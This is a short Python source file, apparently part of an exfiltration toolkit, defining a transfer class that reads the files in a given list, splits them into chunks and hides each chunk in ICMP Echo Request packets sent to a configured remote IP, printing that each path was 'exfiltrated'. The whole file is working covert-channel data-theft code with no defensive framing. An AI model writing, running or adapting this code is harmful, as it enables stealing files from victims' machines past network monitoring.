import time

from npdep_transfer.base.Transfer import Transfer

from npdep_icmp_client.client.Client import Client as ICMPClient
from npdep_icmp_client.type.IcmpType import IcmpType as ICMPType

'''
Transfers data by putting it into ICMP Echo Request Messages
'''
class IcmpEcho(Transfer):
    def __init__(self, options, registration) -> None:
        super().__init__("IcmpEcho", options, registration)
        self.client = ICMPClient(options["ip"], options["port"])

    def send(self, container):
        pkgSize = self.options["pkgSize"]
        for path in container["files"]: 
            with open(path, "rb") as f:
                while True:
                    data = f.read(pkgSize)
                    if not data:
                        # Indicates the end of a file
                        self.client.sendEchoMessage(ICMPType.ECHO_REQUEST, "file_end")
                        break
                    self.client.sendEchoMessage(ICMPType.ECHO_REQUEST, data)
                    time.sleep(0.1)
            print(path + " exfiltrated!")